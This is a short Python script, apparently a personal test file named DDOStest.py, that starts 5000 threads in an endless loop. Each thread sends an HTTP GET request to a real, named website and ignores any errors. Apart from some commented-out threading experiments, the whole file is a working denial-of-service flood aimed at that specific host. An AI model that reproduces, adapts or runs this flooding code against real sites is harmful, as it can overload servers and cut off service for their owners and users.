# -*- coding:utf-8 -*-
# @Time : 2020/5/23 23:41
# @Author : AX
# @File : DDOStest.py
# @Software: PyCharm

import threading
import requests
import time
import requests.exceptions


def thread_job():
    # print("This is an added Thread,number is %s"%threading.current_thread())
    print("T1 Start")
    for i in range(10):
        time.sleep(0.1)
    print("T1 finish\n")


def main():
    # 增加一个线程（实例化一个线程对象）,用target进行run
    # added_thread = threading.Thread(target=thread_job(),name="T1")
    # 当前活跃线程数目
    # added_thread.start()
    try:
        req = requests.get("https://khany.top/")
        # print(threading.current_thread(), " done")
    except Exception as e:
        pass
    # print(threading.active_count())
    # 穷举当前线程
    # print(threading.enumerate())
    # 打印正在运行的线程
    # print(threading.current_thread())


if __name__ == '__main__':
    # main()
    while True:
        try:
            for i in range(5000):
                t = threading.Thread(target=main)
                t.start()
            t.join()
        except Exception as e:
            pass
